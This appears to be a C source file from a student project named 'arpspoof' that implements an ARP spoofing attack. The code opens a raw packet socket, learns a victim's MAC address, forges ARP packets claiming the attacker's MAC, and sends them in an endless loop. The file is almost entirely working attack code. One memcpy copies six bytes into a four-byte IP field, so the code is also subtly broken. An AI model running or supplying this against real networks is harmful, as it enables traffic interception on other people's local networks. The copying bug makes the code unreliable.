/*
** EPITECH PROJECT, 2019
** arpspoof
** File description:
** coding
*/

# include "include.h"

arp_header_t *init_arp_for_spoof(arp_header_t *arp_hdr, s_t *sock, uint8_t *vic)
{
    arp_hdr->htype = htons(1);
    arp_hdr->ptype = htons(ETH_P_IP);
    arp_hdr->hlen = 6;
    arp_hdr->plen = 4;
    arp_hdr->opcode = htons(1);
    memcpy(arp_hdr->sender_mac, &sock->src.sll_addr, 6);
    memcpy(arp_hdr->sender_ip, &sock->src_ip.s_addr, 4);
    memcpy(&sock->dest.sll_addr, vic, ETHER_ADDR_LEN);
    memcpy(arp_hdr->target_mac, &sock->dest.sll_addr, 6);
    memcpy(arp_hdr->target_ip, &sock->dest_ip.s_addr, 6);
    return (arp_hdr);
}

int send_receive(s_t *sock, uint8_t *eth_hdr, uint8_t *rcvd)
{
    if (sendto(sock->sockfd, eth_hdr, sock->size, 0, \
    (struct sockaddr*)&(sock->dest),      \
    sizeof(struct sockaddr_ll)) == -1)
        return (fprintf(stderr, "Failed to send the packets\n"), -1);
    receive_message(sock, rcvd);
    return (0);
}

void spoof(info_t info, uint8_t *eth_hdr, s_t *sock)
{
    while (1) {
        printf("Spoofed packet send to '%s'\n", info.dest_ip);
        sendto(sock->sockfd, eth_hdr, sock->size, 0, \
        (struct sockaddr*)&(sock->dest), sizeof(struct sockaddr_ll));
        sleep(1);
    }
}

int arp_spoof(info_t info, s_t *sock, arp_header_t *arp_hdr, uint8_t *eth_hdr)
{
    uint8_t rcvd[6];

    if (info.printbroad == true) {
        print_packet(eth_hdr, sock);
        exit (0);
    }
    if ((sock->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        return (free(sock), fprintf(stderr, " Socket failed\n"), -1);

    if (send_receive(sock, eth_hdr, rcvd) == -1)
        return (my_free(sock, arp_hdr, eth_hdr), -1);
    printf("Found victim's MAC address: '%02X:%02X:%02X:%02X:%02X:%02X'\n", \
    rcvd[0], rcvd[1], rcvd[2], rcvd[3], rcvd[4], rcvd[5]);
    arp_hdr = init_arp_for_spoof(arp_hdr, sock, rcvd);
    eth_hdr = init_eth_header(sock, arp_hdr);
    spoof(info, eth_hdr, sock);
    return (0);
}
